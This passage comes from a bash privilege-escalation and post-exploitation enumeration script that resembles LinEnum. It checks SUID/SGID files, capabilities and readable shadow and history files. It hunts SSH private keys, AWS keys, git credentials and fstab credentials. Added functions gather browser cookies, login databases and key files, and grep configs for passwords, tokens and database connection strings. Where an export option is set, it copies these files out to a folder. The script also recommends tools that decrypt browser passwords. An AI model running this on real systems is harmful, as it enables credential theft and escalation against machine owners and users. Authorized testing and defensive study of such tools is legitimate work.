echo -e "\e[00;31m[-] Can we read/write sensitive files:\e[00m" ; ls -la /etc/passwd 2>/dev/null ; ls -la /etc/group 2>/dev/null ; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null ; ls -la /etc/master.passwd 2>/dev/null 
echo -e "\n" 

#search for suid files
allsuid=`find / -perm -4000 -type f 2>/dev/null`
findsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsuid" ]; then
  echo -e "\e[00;31m[-] SUID files:\e[00m\n$findsuid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsuid" ]; then
  mkdir $format/suid-files/ 2>/dev/null
  for i in $findsuid; do cp $i $format/suid-files/; done 2>/dev/null
fi

#list of 'interesting' suid files - feel free to make additions
intsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsuid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SUID files:\e[00m\n$intsuid" 
  echo -e "\n"
fi

#lists world-writable suid files
wwsuid=`find $allsuid -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuid" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: World-writable SUID files:\e[00m\n$wwsuid" 
  echo -e "\n"
fi

#lists world-writable suid files owned by root
wwsuidrt=`find $allsuid -uid 0 -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files owned by root:\e[00m\n$wwsuidrt" 
  echo -e "\n"
fi

#search for sgid files
allsgid=`find / -perm -2000 -type f 2>/dev/null`
findsgid=`find $allsgid -perm -2000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsgid" ]; then
  echo -e "\e[00;31m[-] SGID files:\e[00m\n$findsgid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsgid" ]; then
  mkdir $format/sgid-files/ 2>/dev/null
  for i in $findsgid; do cp $i $format/sgid-files/; done 2>/dev/null
fi

#list of 'interesting' sgid files
intsgid=`find $allsgid -perm -2000 -type f  -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsgid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SGID files:\e[00m\n$intsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files
wwsgid=`find $allsgid -perm -2002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgid" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files:\e[00m\n$wwsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files owned by root
wwsgidrt=`find $allsgid -uid 0 -perm -2002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files owned by root:\e[00m\n$wwsgidrt" 
  echo -e "\n"
fi

#list all files with POSIX capabilities set along with there capabilities
fileswithcaps=`getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null`
if [ "$fileswithcaps" ]; then
  echo -e "\e[00;31m[+] Files with POSIX capabilities set:\e[00m\n$fileswithcaps"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fileswithcaps" ]; then
  mkdir $format/files_with_capabilities/ 2>/dev/null
  for i in $fileswithcaps; do cp $i $format/files_with_capabilities/; done 2>/dev/null
fi

#searches /etc/security/capability.conf for users associated capapilies
userswithcaps=`grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null`
if [ "$userswithcaps" ]; then
  echo -e "\e[00;33m[+] Users with specific POSIX capabilities:\e[00m\n$userswithcaps"
  echo -e "\n"
fi

if [ "$userswithcaps" ] ; then
#matches the capabilities found associated with users with the current user
matchedcaps=`echo -e "$userswithcaps" | grep \`whoami\` | awk '{print $1}' 2>/dev/null`
	if [ "$matchedcaps" ]; then
		echo -e "\e[00;33m[+] Capabilities associated with the current user:\e[00m\n$matchedcaps"
		echo -e "\n"
		#matches the files with capapbilities with capabilities associated with the current user
		matchedfiles=`echo -e "$matchedcaps" | while read -r cap ; do echo -e "$fileswithcaps" | grep "$cap" ; done 2>/dev/null`
		if [ "$matchedfiles" ]; then
			echo -e "\e[00;33m[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):\e[00m\n$matchedfiles"
			echo -e "\n"
			#lists the permissions of the files having the same capabilies associated with the current user
			matchedfilesperms=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do ls -la $f ;done 2>/dev/null`
			echo -e "\e[00;33m[+] Permissions of files with the same capabilities associated with the current user:\e[00m\n$matchedfilesperms"
			echo -e "\n"
			if [ "$matchedfilesperms" ]; then
				#checks if any of the files with same capabilities associated with the current user is writable
				writablematchedfiles=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do find $f -writable -exec ls -la {} + ;done 2>/dev/null`
				if [ "$writablematchedfiles" ]; then
					echo -e "\e[00;33m[+] User/Group writable files with the same capabilities associated with the current user:\e[00m\n$writablematchedfiles"
					echo -e "\n"
				fi
			fi
		fi
	fi
fi

#look for private keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
privatekeyfiles=`grep -rl "PRIVATE KEY-----" /home 2>/dev/null`
	if [ "$privatekeyfiles" ]; then
  		echo -e "\e[00;33m[+] Private SSH keys found!:\e[00m\n$privatekeyfiles"
  		echo -e "\n"
	fi
fi

#look for AWS keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
awskeyfiles=`grep -rli "aws_secret_access_key" /home 2>/dev/null`
	if [ "$awskeyfiles" ]; then
  		echo -e "\e[00;33m[+] AWS secret keys found!:\e[00m\n$awskeyfiles"
  		echo -e "\n"
	fi
fi

#look for git credential files - thanks djhohnstein
if [ "$thorough" = "1" ]; then
gitcredfiles=`find / -name ".git-credentials" 2>/dev/null`
	if [ "$gitcredfiles" ]; then
  		echo -e "\e[00;33m[+] Git credentials saved on the machine!:\e[00m\n$gitcredfiles"
  		echo -e "\n"
	fi
fi

#list all world-writable files excluding /proc and /sys
if [ "$thorough" = "1" ]; then
wwfiles=`find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwfiles" ]; then
		echo -e "\e[00;31m[-] World-writable files (excluding /proc and /sys):\e[00m\n$wwfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wwfiles" ]; then
		mkdir $format/ww-files/ 2>/dev/null
		for i in $wwfiles; do cp --parents $i $format/ww-files/; done 2>/dev/null
	fi
fi

#are any .plan files accessible in /home (could contain useful information)
usrplan=`find /home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$usrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$usrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $usrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

bsdusrplan=`find /usr/home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$bsdusrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$bsdusrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdusrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $bsdusrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

#are there any .rhosts files accessible - these may allow us to login as another user etc.
rhostsusr=`find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$rhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostsusr" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

bsdrhostsusr=`find /usr/home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$bsdrhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$bsdrhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdrhostsusr" ]; then
  mkdir $format/rhosts 2>/dev/null
  for i in $bsdrhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

rhostssys=`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostssys" ]; then
  echo -e "\e[00;33m[+] Hosts.equiv file and contents: \e[00m\n$rhostssys" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostssys" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostssys; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

#list nfs shares/permisisons etc.
nfsexports=`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`
if [ "$nfsexports" ]; then
  echo -e "\e[00;31m[-] NFS config details: \e[00m\n$nfsexports" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$nfsexports" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/exports $format/etc-export/exports 2>/dev/null
fi

if [ "$thorough" = "1" ]; then
  #phackt
  #displaying /etc/fstab
  fstab=`cat /etc/fstab 2>/dev/null`
  if [ "$fstab" ]; then
    echo -e "\e[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems\e[00m"
    echo -e "$fstab"
    echo -e "\n"
  fi
fi

#looking for credentials in /etc/fstab
fstab=`grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null`
if [ "$fstab" ]; then
  echo -e "\e[00;33m[+] Looks like there are credentials in /etc/fstab!\e[00m\n$fstab"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fstab" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

fstabcred=`grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null`
if [ "$fstabcred" ]; then
    echo -e "\e[00;33m[+] /etc/fstab contains a credentials file!\e[00m\n$fstabcred" 
    echo -e "\n"
fi

if [ "$export" ] && [ "$fstabcred" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

#use supplied keyword and cat *.conf files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.conf files as no keyword was entered\n" 
  else
    confkey=`find / -maxdepth 4 -name *.conf -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$confkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$confkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .conf files" 
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$confkey" ]; then
	  confkeyfile=`find / -maxdepth 4 -name *.conf -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/config_files/ 2>/dev/null
      for i in $confkeyfile; do cp --parents $i $format/keyword_file_matches/config_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.php files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.php files as no keyword was entered\n" 
  else
    phpkey=`find / -maxdepth 10 -name *.php -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$phpkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels - output format filepath:identified line number where keyword appears):\e[00m\n$phpkey" 
      echo -e "\n" 
     else 
  echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels):\e[00m" 
  echo -e "'$keyword' not found in any .php files" 
  echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$phpkey" ]; then
    phpkeyfile=`find / -maxdepth 10 -name *.php -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/php_files/ 2>/dev/null
      for i in $phpkeyfile; do cp --parents $i $format/keyword_file_matches/php_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.log files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.log files as no keyword was entered\n" 
  else
    logkey=`find / -maxdepth 4 -name *.log -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$logkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$logkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .log files"
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$logkey" ]; then
      logkeyfile=`find / -maxdepth 4 -name *.log -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
	  mkdir --parents $format/keyword_file_matches/log_files/ 2>/dev/null
      for i in $logkeyfile; do cp --parents $i $format/keyword_file_matches/log_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.ini files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.ini files as no keyword was entered\n" 
  else
    inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$inikey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$inikey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .ini files" 
	echo -e "\n"
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$inikey" ]; then
	  inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/ini_files/ 2>/dev/null
      for i in $inikey; do cp --parents $i $format/keyword_file_matches/ini_files/ ; done 2>/dev/null
  fi
fi

#quick extract of .conf files from /etc - only 1 level
allconf=`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null`
if [ "$allconf" ]; then
  echo -e "\e[00;31m[-] All *.conf files in /etc (recursive 1 level):\e[00m\n$allconf" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$allconf" ]; then
  mkdir $format/conf-files/ 2>/dev/null
  for i in $allconf; do cp --parents $i $format/conf-files/; done 2>/dev/null
fi

#extract any user history files that are accessible
usrhist=`ls -la ~/.*_history 2>/dev/null`
if [ "$usrhist" ]; then
  echo -e "\e[00;31m[-] Current user's history files:\e[00m\n$usrhist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrhist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  for i in $usrhist; do cp --parents $i $format/history_files/; done 2>/dev/null
fi

#can we read roots *_history files - could be passwords stored etc.
roothist=`ls -la /root/.*_history 2>/dev/null`
if [ "$roothist" ]; then
  echo -e "\e[00;33m[+] Root's history files are accessible!\e[00m\n$roothist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$roothist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  cp $roothist $format/history_files/ 2>/dev/null
fi

#all accessible .bash_history files in /home
checkbashhist=`find /home -name .bash_history -print -exec cat {} 2>/dev/null \;`
if [ "$checkbashhist" ]; then
  echo -e "\e[00;31m[-] Location and contents (if accessible) of .bash_history file(s):\e[00m\n$checkbashhist"
  echo -e "\n"
fi

#any .bak files that may be of interest
bakfiles=`find / -name *.bak -type f 2</dev/null`
if [ "$bakfiles" ]; then
  echo -e "\e[00;31m[-] Location and Permissions (if accessible) of .bak file(s):\e[00m"
  for bak in `echo $bakfiles`; do ls -la $bak;done
  echo -e "\n"
fi

#is there any mail accessible
readmail=`ls -la /var/mail 2>/dev/null`
if [ "$readmail" ]; then
  echo -e "\e[00;31m[-] Any interesting mail in /var/mail:\e[00m\n$readmail" 
  echo -e "\n"
fi

#can we read roots mail
readmailroot=`head /var/mail/root 2>/dev/null`
if [ "$readmailroot" ]; then
  echo -e "\e[00;33m[+] We can read /var/mail/root! (snippet below)\e[00m\n$readmailroot" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmailroot" ]; then
  mkdir $format/mail-from-root/ 2>/dev/null
  cp $readmailroot $format/mail-from-root/ 2>/dev/null
fi
}

browser_data()
{
echo -e "\e[00;33m### BROWSER DATA ########################################\e[00m" 

#Chrome/Chromium browser data locations
echo -e "\e[00;31m[-] Searching for Chrome/Chromium browser data...\e[00m"

chromepaths=`find /home -type f \( -name "Cookies" -o -name "Login Data" -o -name "History" -o -name "Bookmarks" \) 2>/dev/null | grep -E "\.config/(google-chrome|chromium|chrome|BraveSoftware)" 2>/dev/null`
if [ "$chromepaths" ]; then
  echo -e "\e[00;33m[+] Chrome/Chromium browser files found:\e[00m\n$chromepaths"
  echo -e "\n"
fi

if [ "$export" ] && [ "$chromepaths" ]; then
  mkdir $format/browser-data/ 2>/dev/null
  for i in $chromepaths; do cp --parents $i $format/browser-data/ 2>/dev/null; done
fi

#Firefox browser data locations
echo -e "\e[00;31m[-] Searching for Firefox browser data...\e[00m"

firefoxpaths=`find /home -type f \( -name "cookies.sqlite" -o -name "key4.db" -o -name "logins.json" -o -name "places.sqlite" \) 2>/dev/null | grep -E "\.mozilla/firefox" 2>/dev/null`
if [ "$firefoxpaths" ]; then
  echo -e "\e[00;33m[+] Firefox browser files found:\e[00m\n$firefoxpaths"
  echo -e "\n"
fi

if [ "$export" ] && [ "$firefoxpaths" ]; then
  mkdir $format/browser-data/ 2>/dev/null
  for i in $firefoxpaths; do cp --parents $i $format/browser-data/ 2>/dev/null; done
fi

#Edge browser data locations
echo -e "\e[00;31m[-] Searching for Edge browser data...\e[00m"

edgepaths=`find /home -type f \( -name "Cookies" -o -name "Login Data" -o -name "History" \) 2>/dev/null | grep -E "\.config/microsoft-edge" 2>/dev/null`
if [ "$edgepaths" ]; then
  echo -e "\e[00;33m[+] Edge browser files found:\e[00m\n$edgepaths"
  echo -e "\n"
fi

if [ "$export" ] && [ "$edgepaths" ]; then
  mkdir $format/browser-data/ 2>/dev/null
  for i in $edgepaths; do cp --parents $i $format/browser-data/ 2>/dev/null; done
fi

#Opera browser data locations
echo -e "\e[00;31m[-] Searching for Opera browser data...\e[00m"

operapaths=`find /home -type f \( -name "Cookies" -o -name "Login Data" -o -name "History" \) 2>/dev/null | grep -E "\.config/opera" 2>/dev/null`
if [ "$operapaths" ]; then
  echo -e "\e[00;33m[+] Opera browser files found:\e[00m\n$operapaths"
  echo -e "\n"
fi

if [ "$export" ] && [ "$operapaths" ]; then
  mkdir $format/browser-data/ 2>/dev/null
  for i in $operapaths; do cp --parents $i $format/browser-data/ 2>/dev/null; done
fi

#Brave browser data locations
echo -e "\e[00;31m[-] Searching for Brave browser data...\e[00m"

bravepaths=`find /home -type f \( -name "Cookies" -o -name "Login Data" -o -name "History" \) 2>/dev/null | grep -E "BraveSoftware/Brave-Browser" 2>/dev/null`
if [ "$bravepaths" ]; then
  echo -e "\e[00;33m[+] Brave browser files found:\e[00m\n$bravepaths"
  echo -e "\n"
fi

if [ "$export" ] && [ "$bravepaths" ]; then
  mkdir $format/browser-data/ 2>/dev/null
  for i in $bravepaths; do cp --parents $i $format/browser-data/ 2>/dev/null; done
fi

#Check for readable browser profile directories
echo -e "\e[00;31m[-] Checking browser profile directory permissions...\e[00m"

chromeprofiles=`find /home -type d -name "Default" 2>/dev/null | grep -E "\.config/(google-chrome|chromium|chrome)" | xargs -I {} ls -la {} 2>/dev/null`
if [ "$chromeprofiles" ]; then
  echo -e "\e[00;33m[+] Chrome profile directories accessible:\e[00m\n$chromeprofiles"
  echo -e "\n"
fi

firefoxprofiles=`find /home -type d -name "*.default*" 2>/dev/null | grep -E "\.mozilla/firefox" | xargs -I {} ls -la {} 2>/dev/null`
if [ "$firefoxprofiles" ]; then
  echo -e "\e[00;33m[+] Firefox profile directories accessible:\e[00m\n$firefoxprofiles"
  echo -e "\n"
fi

#Look for browser credential/encryption key files
echo -e "\e[00;31m[-] Searching for browser encryption keys...\e[00m"

chromekeys=`find /home -type f -name "Local State" 2>/dev/null | grep -E "\.config/(google-chrome|chromium|chrome|BraveSoftware)" 2>/dev/null`
if [ "$chromekeys" ]; then
  echo -e "\e[00;33m[+] Chrome encryption key files found:\e[00m\n$chromekeys"
  echo -e "\n"
fi

firefoxkeys=`find /home -type f \( -name "key3.db" -o -name "key4.db" \) 2>/dev/null | grep -E "\.mozilla/firefox" 2>/dev/null`
if [ "$firefoxkeys" ]; then
  echo -e "\e[00;33m[+] Firefox encryption key files found:\e[00m\n$firefoxkeys"
  echo -e "\n"
fi

#Check for browser password manager files
if [ "$thorough" = "1" ]; then
  echo -e "\e[00;31m[-] Performing thorough browser session/cache search...\e[00m"
  
  browsercache=`find /home -type f \( -name "Cache" -o -name "Sessions" -o -name "sessionstore.js" \) 2>/dev/null | grep -E "\.(config|mozilla|cache)" | head -20 2>/dev/null`
  if [ "$browsercache" ]; then
    echo -e "\e[00;31m[-] Browser cache and session files found (showing first 20):\e[00m\n$browsercache"
    echo -e "\n"
  fi
fi

echo -e "\e[00;33m[!] Note: Browser databases may be encrypted. Use tools like:\e[00m"
echo -e "\e[00;33m    - firefox_decrypt (Firefox)\e[00m"
echo -e "\e[00;33m    - chrome-passwords (Chrome/Chromium)\e[00m"
echo -e "\e[00;33m    - LaZagne (Multi-browser)\e[00m"
echo -e "\n"
}

password_hunter()
{
echo -e "\e[00;33m### PASSWORD HUNTER #####################################\e[00m" 

echo -e "\e[00;31m[-] Hunting for passwords in configuration files...\e[00m"
echo -e "\n"

#Search for common password patterns in config files
echo -e "\e[00;31m[-] Searching for password patterns in common config files...\e[00m"

# Define password patterns
password_patterns='password\s*=|passwd\s*=|pwd\s*=|pass\s*=|PASSWORD\s*=|PASSWD\s*=|api_key\s*=|apikey\s*=|secret\s*=|SECRET\s*=|token\s*=|TOKEN\s*='

# Search in common config directories
configdirs="/etc /home /opt /var/www /usr/local/etc"

for dir in $configdirs; do
  if [ -d "$dir" ]; then
    configpasswords=`grep -rEi "$password_patterns" $dir 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|env|properties|txt):" 2>/dev/null | head -50`
    if [ "$configpasswords" ]; then
      echo -e "\e[00;33m[+] Potential passwords found in $dir:\e[00m\n$configpasswords"
      echo -e "\n"
    fi
  fi
done

#Search for database connection strings
echo -e "\e[00;31m[-] Searching for database connection strings...\e[00m"

# MySQL/MariaDB connection strings
mysqlconns=`grep -rEi "mysql://|mysqli://|mysql_connect|mysql:host=|DB_HOST.*mysql|MYSQL_" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|properties|php|py|rb|js|env|sql):" 2>/dev/null | head -25`
if [ "$mysqlconns" ]; then
  echo -e "\e[00;33m[+] MySQL/MariaDB connection strings:\e[00m\n$mysqlconns"
  echo -e "\n"
fi

# PostgreSQL connection strings
postgresconns=`grep -rEi "postgresql://|postgres://|pgsql://|psql://|pg_connect|host=.*dbname=|POSTGRES_|PGPASSWORD" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|properties|php|py|rb|js|env|sql):" 2>/dev/null | head -25`
if [ "$postgresconns" ]; then
  echo -e "\e[00;33m[+] PostgreSQL connection strings:\e[00m\n$postgresconns"
  echo -e "\n"
fi

# MongoDB connection strings
mongoconns=`grep -rEi "mongodb://|mongodb\+srv://|mongo://|MongoClient|MONGO_URL|MONGODB_URI" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|properties|php|py|rb|js|env):" 2>/dev/null | head -25`
if [ "$mongoconns" ]; then
  echo -e "\e[00;33m[+] MongoDB connection strings:\e[00m\n$mongoconns"
  echo -e "\n"
fi

# Redis connection strings
redisconns=`grep -rEi "redis://|rediss://|REDIS_URL|REDIS_HOST|REDIS_PASSWORD|redis_connect" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|env|php|py|rb|js):" 2>/dev/null | head -20`
if [ "$redisconns" ]; then
  echo -e "\e[00;33m[+] Redis connection strings:\e[00m\n$redisconns"
  echo -e "\n"
fi

# MSSQL/SQL Server connection strings
mssqlconns=`grep -rEi "Server=|Data Source=|Initial Catalog=|sqlsrv:|mssql:|MSSQL_|SqlConnection" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|properties|cs|vb|php|py):" 2>/dev/null | grep -i "password\|pwd\|user" | head -20`
if [ "$mssqlconns" ]; then
  echo -e "\e[00;33m[+] MSSQL/SQL Server connection strings:\e[00m\n$mssqlconns"
  echo -e "\n"
fi

# Oracle database connection strings
oracleconns=`grep -rEi "jdbc:oracle:|oci:|ORACLE_|TNS_ADMIN|oracle_connect|sid=|service_name=" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|properties|java|php|py):" 2>/dev/null | head -20`
if [ "$oracleconns" ]; then
  echo -e "\e[00;33m[+] Oracle database connection strings:\e[00m\n$oracleconns"
  echo -e "\n"
fi

# SQLite database files and connections
sqliteconns=`grep -rEi "sqlite://|sqlite3\.|\.db\"|\.sqlite\"|DATABASE.*\.db|DATABASE.*\.sqlite" /home /var/www /opt 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|php|py|rb|js):" 2>/dev/null | head -20`
if [ "$sqliteconns" ]; then
  echo -e "\e[00;33m[+] SQLite connection strings:\e[00m\n$sqliteconns"
  echo -e "\n"
fi

# Find actual SQLite database files
sqlitefiles=`find /home /var/www /opt -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) 2>/dev/null | head -30`
if [ "$sqlitefiles" ]; then
  echo -e "\e[00;33m[+] SQLite database files found:\e[00m\n$sqlitefiles"
  echo -e "\n"
fi

if [ "$export" ] && [ "$sqlitefiles" ]; then
  mkdir $format/sqlite-databases/ 2>/dev/null
  for i in $sqlitefiles; do cp --parents $i $format/sqlite-databases/ 2>/dev/null; done
fi

# Elasticsearch connection strings
elasticconns=`grep -rEi "elasticsearch://|ELASTICSEARCH_|ELASTIC_URL|es_host|elastic_search" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|env|php|py|rb|js):" 2>/dev/null | head -20`
if [ "$elasticconns" ]; then
  echo -e "\e[00;33m[+] Elasticsearch connection strings:\e[00m\n$elasticconns"
  echo -e "\n"
fi

# CouchDB connection strings
couchconns=`grep -rEi "couchdb://|COUCHDB_|couch_url" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|env):" 2>/dev/null | head -15`
if [ "$couchconns" ]; then
  echo -e "\e[00;33m[+] CouchDB connection strings:\e[00m\n$couchconns"
  echo -e "\n"
fi

# Cassandra connection strings
cassandraconns=`grep -rEi "cassandra://|CASSANDRA_|contact_points.*cassandra" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|env):" 2>/dev/null | head -15`
if [ "$cassandraconns" ]; then
  echo -e "\e[00;33m[+] Cassandra connection strings:\e[00m\n$cassandraconns"
  echo -e "\n"
fi

# Generic JDBC connection strings
jdbcconns=`grep -rEi "jdbc:[a-z]+://|DriverManager\.getConnection|JdbcTemplate" /home /var/www /opt /etc 2>/dev/null | grep -v "Binary file" | grep -E "\.(conf|config|cfg|ini|yaml|yml|json|xml|properties|java):" 2>/dev/null | head -20`
if [ "$jdbcconns" ]; then
  echo -e "\e[00;33m[+] JDBC connection strings:\e[00m\n$jdbcconns"
  echo -e "\n"
fi

# Database configuration files
echo -e "\e[00;31m[-] Searching for database configuration files...\e[00m"

dbconfigfiles=`find /home /var/www /opt /etc -type f \( -name "database.yml" -o -name "database.yaml" -o -name "db.conf" -o -name "db.config" -o -name "*database*.ini" -o -name "datasource.properties" -o -name "hibernate.cfg.xml" -o -name "persistence.xml" \) 2>/dev/null | xargs -I {} sh -c 'echo "==> {}" && cat {} 2>/dev/null | grep -Ei "host|user|password|port|database|schema" | head -10' 2>/dev/null`
